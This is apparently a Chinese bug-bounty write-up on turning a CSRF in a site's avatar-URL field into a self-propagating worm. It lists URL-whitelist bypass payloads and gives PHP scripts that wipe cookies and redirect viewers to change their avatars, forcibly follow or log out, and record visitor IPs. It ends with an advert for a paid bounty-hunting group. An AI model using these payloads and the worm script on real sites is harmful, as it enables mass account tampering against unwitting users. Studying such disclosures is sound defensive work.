#  记一次某大厂csrf漏洞通过蠕虫从低危到高危  
 Z2O安全攻防   2025-06-09 13:23  
  
本文记载了笔者src漏洞挖掘的经历，如何将一个简单的csrf提高至高危的程度  
# 初见端倪  
  
在上传的头像的点位:  
  
![blog1.png](https://mmbiz.qpic.cn/mmbiz_jpg/iar31WKQlTTpUgwIpGMBDIhGty5nNT6waMzlQuZBAtVCPhQOM2j4fm5DP2stsvPchJBDI7gHaaiccdwlut9paicjg/640?wx_fmt=jpeg&from=appmsg "")  
  
当时抓了一个包，发现这个地方更换头像分为三部走:  
- 一，把头像图片上传到云返回云上的地址  
  
- 二，通过另外一个接口上传头像地址的链接  
  
- 三，通过前端中的<img src="头像地址">  
显示  
  
乍一看应该没啥问题，但是问题大了，就出在第二部分。加载图片的本质实际上是去发送一个get请求，但如果这个get请求指向的是某个站内的api，是不是就相当于触发了这个GET请求的接口？这就来试试  
  
```
{"code":500,"message":"URL异常"}
```  
  
很显然，开发者已经想到这一步了，接下来就考虑如何绕过了  
# 绕过限制  
  
已知对方的云服务器地址是xxxcloud.net (已经打码)， 先是测试了@xxxcloud.net  
```
POST /v1.1/avaimageupload.api?product=*****-HTTP/2Host: api.*****.comCookie:****User-Agent: *****-Android 8.1.9 (22127RK46C; Android 9; null) WIFI*****-Phone-Login-Auth: *****Market: *****Deviceid: *****Dadeviceid: *****Androidid: f99ebeddbfb51ff1X-Reqid: ZM5XC3Q0Accept-Encoding: gzip, deflate, brContent-Type: application/x-www-form-urlencoded; charset=utf-8Content-Length: 76imageUrl=***.xxxcloud.net/**.png&blogId=***
```  
### 第一层限制  
  
结果发现是要求必须用xxxcloud.net开头的域名，这个简单，我这里直接使用@  
来绕过就可以了  
http://xxxcloud.net@vps.hacker/  
 会把@前面的东西解析成用户名，就导致了绕过。当然，还有很多中方式来绕过这层限制，这里列举几种常用的。比如@  
你甚至还可以和?  
组合拳  
  
在服务端看来  
```
http://www.hack.com?@qq.com
```  
  
域名是qq.com  
  
但是浏览器特性：会在?前面添加/，所以实际访问的域名就是  
```
http://www.hack.com/?@qq.com
```  
  
还有就是\  
浏览器会默认转成/  
```
http://hack.com\.www.qq.com
```  
  
还有就是:../  
目录穿越绕过  
```
http://www.qq.com/../hack.com
```  
  
你甚至可以使用宽字节的思路来绕过  
```
http://hack.com%df/.qq.com
```  
  
但是这个位置不止在此一个过滤还有其他限制  
## 结尾绕过  
  
经过模糊测试，要求结尾必须是.png .jpg .gif中的一个，这可咋办？  
  
简单我们使用?&<无关紧要的参数>=.jpg  
,绕过  
# 初步利用  
  
现在我们已经可以通过上述手段让受害者通过<img src>  
标签来实现对我们服务器的GET API访问，但是这其实没有任何危害。  
## 退出dos  
  
第一种利用方式是dos。经过测试我发现这个大厂论坛的退出接口虽然是通过POST传参的，但其实还是允许接受GET传参/api/logout  
，这就造成了个问题如果我让受害者访问这个攻击者路由的过程中302转跳访问了/api/logout  
不就自动退出登录了吗？这种情况就造成了我只要顶着我这个头像去大V留个言的作品底下留个言论，凡是看到我评论的就会掉线，这就是最简单的拒绝服务攻击。有人会说，如果logout  
接口是只允许POST传参，这下就该咋办呢？别急，我们还可以在VPS上出创建一个php脚本  
```
<?php// 清空当前所有Cookieif (isset($_COOKIE)) {    foreach ($_COOKIEas$name => $value) {        // 设置Cookie的过期时间为过去，这样浏览器会自动删除它        setcookie($name, '', time() - 86400, '/');    }}?>
```  
  
这样我们通过把cookie值设置到了过去变相的去删除了浏览器中的所有cookie，回到那个论坛由于没有cookie也就自动退出了。但是这个影响还是很有限，只能到中危，如何进一步提高危害呢？  
# 柳暗花明  
  
这个时候发现了一个点位虽然这个修改头像是默认POST传参的，但是你还是可以通过GET传参提交  
```
api.*****.com/v1.1/avaimageupload.api?product=*****&imageUrl=***vps/**.png&blogId=***
```  
  
这就有意思了兄弟们，试想一下，如果我通过vps+302跳转到  
http://api.*****.com/v1.1/avaimageupload.api?product=*****&amp;imageUrl=**\*vps/\**.png&amp;blogId=  
***  
  
这个路由，那会发生什么？  
  
没错，当别人看到我头像(指向GET修改头像的API)，就会自动修改自己的头像，成指向GET修改头像的API，然后其他人再去看到他们的头像。。。  
  
一传十，十传百这样就可以影响到全站的用户。如果这个时候，我把VPS上的poc.php内容修改成退出访问/logout，不就会让全站的用户的退出了吗？  
  
等下，利用链不止于此，我发现那个关注的接口也是可以通过GET传参，这就说明可以恶意刷关注量了。  
# 实践开始  
  
首先在对应的服务器上创建这样一个php脚本用于转跳  
```
<?phpsession_start(); // 启用会话$ip = $_SERVER['REMOTE_ADDR']; // 获取访问者的 IP 地址$referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : ''; // 获取 Referer// 定义跳转 URL$firstRedirect = "https://api.*****.com/v1.1/avaimageupload.api?product=*****-android-8.1.9&imageUrl=www.7ntsec.cn/avaimg.*****.net/location_check.php&blogId=2267493166";$secondRedirect = "https://api.*****.com/v1.1/follow.api?followtype=follow&product=*****-android-8.1.9&targetblogid=529578359&blogdomain=*****gamer.*****.com";$refererRedirect = "https://avaimg.*****.net/img/";// 日志文件路径$logFile = "./access_log.txt";// 记录日志的函数functionlogAccess($ip, $referer, $visitCount, $redirectUrl) {global$logFile;$timestamp = date("Y-m-d H:i:s");$logEntry = "[$timestamp] IP: $ip | Referer: $referer | Visit Count: $visitCount | Redirect: $redirectUrl\n";  file_put_contents($logFile, $logEntry, FILE_APPEND); // 追加写入日志}// 如果 Referer 包含 gcweb.*****.com，则直接跳转并记录日志if (strpos($referer, "gcweb.*****.com") !== false) {  logAccess($ip, $referer, "N/A", $refererRedirect);  header("Location: $refererRedirect");exit;}// 记录访问次数（基于 IP）if (!isset($_SESSION['visit_count'][$ip])) {$_SESSION['visit_count'][$ip] = 1;} else {$_SESSION['visit_count'][$ip]++;}// 根据访问次数进行跳转并记录日志if ($_SESSION['visit_count'][$ip] == 1) {  logAccess($ip, $referer, $_SESSION['visit_count'][$ip], $firstRedirect);  header("Location: $firstRedirect");exit;} elseif ($_SESSION['visit_count'][$ip] == 2) {  logAccess($ip, $referer, $_SESSION['visit_count'][$ip], $secondRedirect);  header("Location: $secondRedirect");exit;}?>
```  
  
我这里的思路就是同一个IP第一次访问就是去修改头像，第二次就是直接退出，就实现了自动利用的效果。  
  
但还是碰到这个问题，回到上述的数据包:  
```
api.*****.com/v1.1/avaimageupload.api?product=*****&imageUrl=***vps/**.png&blogId=***
```  
  
我们还需要这个blogid如果获取不了的话就会修改不成  
  
这里我组合利用了另外一个接口:  
```
https://****/*****/web/all.json?key=<username>
```  
  
这个可以直接获取那些高赞博主blogid,就造成了利用。虽然到这一步还是不能自动化利用，但是还是可以通过获取特定高粉丝博主的blogid，然后修改csrfpoc对应的blogid，在这些博主的作品留言实现定向感染高粉丝博主，感染完成后，修改poc成具体危害的数据包如退出，关注等，实现大规模利用的。最终评级是拿到了高危。  
  
建立了一个  
src专项圈子  
，内容包含**src漏洞知识库**  
、**src挖掘技巧**  
、**src视频教程**  
等，一起学习赚赏金技巧，以及专属微信群一起挖洞  
  
圈子专注于更新src相关：  
  
```
1、维护更新src专项漏洞知识库，包含原理、挖掘技巧、实战案例
2、分享src优质视频课程
3、分享src挖掘技巧tips
4、小群一起挖洞
```  
  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuaRqDOYRFjU73rIsVy2ISg41LkR0ezBlmjJY4Lwgg8mr1A5efwqe0yGE9KTQwLPJTe9zyv3wgYnhA/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuY813zmiaXibeTuHFXd8WtJAOXg868PqXyjsACp9LhuEeyfB2kTZVOt5Pz48txg7ueRUvDdeefTNKdg/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_jpg/h8P1KUHOKuZDDDv3NsbJDuSicLzBbwVDCPFgbmiaJ4ibf4LRgafQDdYodOgakdpbU1H6XfFQCL81VTudGBv2WniaDA/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "null")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_jpg/h8P1KUHOKuYY8q8CZqffeicCspiaq3u0y7lQ2ia1ZLXbhqIbjvnBdsrlTFOJjSXbu8fmmliaLticl6P0iaXjbnxokM0g/640?wx_fmt=jpeg&from=appmsg&wxfrom=5&wx_lazy=1&tp=webp "")  
  
  
图片  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuaRqDOYRFjU73rIsVy2ISg4Bd1oBmTkA5xlNwZM5fLghYeibMBttWrf57h8sU7xDyTe5udCNicuHo8w/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuYrUoo5XZpxN9Inq87ic71D6aUeMdaWrKXgYYia2On8nMA7bqWDySa8odAq1a0kkp3WFgf0Zp0Eut0A/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
图片  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuaRqDOYRFjU73rIsVy2ISg4KKlic4yiafWTpLdejicQe3MllEQc24ypeI3anaK7IjJDVyq1WVQN2yKBA/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
图片  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuY813zmiaXibeTuHFXd8WtJAOHgjJxnq1ibibJgVUx3LwCjZj62vygx8w6rxia1icmIWiax2YlP6S6LmlmlQ/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
图片  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuY813zmiaXibeTuHFXd8WtJAOApVm8H605qOibxia5DqPHfbWD6lmcweDjGv4DLl45waD068ugw2Iv2vg/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
图片  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuY813zmiaXibeTuHFXd8WtJAOwldaSATYOh1WQpk1qz15rLxehOAn4aK7tdbSyNEuHDZpIISCtl6Q8w/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
图片  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuaRqDOYRFjU73rIsVy2ISg4jFsKRMMNDKbsAZhscCiagnyJScMVmFUqMtae5omlLRdu095mywWszjQ/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
图片  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuaRqDOYRFjU73rIsVy2ISg4uGJ2SA5BhZ3UyibZvVmcP3sozQEOfVr0jftWpC3YkpDiaAicS1ib3EgXHA/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
  
